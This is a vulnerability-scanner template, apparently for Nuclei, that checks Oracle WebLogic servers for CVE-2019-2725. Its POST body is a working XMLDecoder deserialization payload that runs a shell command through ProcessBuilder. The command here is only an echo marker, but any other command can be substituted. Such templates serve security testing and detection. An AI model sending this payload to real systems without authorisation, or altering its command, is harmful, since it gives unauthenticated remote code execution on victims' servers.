id: CVE-2019-2725

info:
  name: Oracle WebLogic Server wls9-async XML Deserialization RCE (CVE-2019-2725)
  author: psibot 
  severity: critical
  description: |
    Vulnerability in the Oracle WebLogic Server wls9-async component allows
    unauthenticated attackers with network access via HTTP to execute arbitrary code.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2019-2725
    - https://www.oracle.com/security-alerts/alert-cve-2019-2725.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-2725
  tags: cve,cve2019,weblogic,rce,oracle,xml-deserialization,wls9-async

http:
  - method: GET
    path:
      - "{{BaseURL}}/_async/AsyncResponseService"
      - "{{BaseURL}}/_async/AsyncResponseServiceHttps"
      - "{{BaseURL}}/wls-wsat/CoordinatorPortType"
    
    matchers:
      - type: word
        words:
          - "AsyncResponseService"
          - "CoordinatorPortType"
          - "weblogic.wsee"
        condition: or
        part: body
      - type: status
        status:
          - 200

  - method: POST
    path:
      - "{{BaseURL}}/_async/AsyncResponseService"
      - "{{BaseURL}}/wls-wsat/CoordinatorPortType"
    
    headers:
      Content-Type: text/xml
      Accept: '*/*'
    
    body: |
      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
          <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.8" class="java.beans.XMLDecoder">
              <void class="java.lang.ProcessBuilder">
                <array class="java.lang.String" length="3">
                  <void index="0">
                    <string>/bin/sh</string>
                  </void>
                  <void index="1">
                    <string>-c</string>
                  </void>
                  <void index="2">
                    <string>echo CVE-2019-2725-TEST</string>
                  </void>
                </array>
                <void method="start"/>
              </void>
            </java>
          </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
      </soapenv:Envelope>
    
    matchers:
      - type: word
        words:
          - "CVE-2019-2725-TEST"
        part: body
      - type: status
        status:
          - 200

    extractors:
      - type: regex
        name: version
        internal: true
        regex:
          - 'WebLogic Server.*?([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)'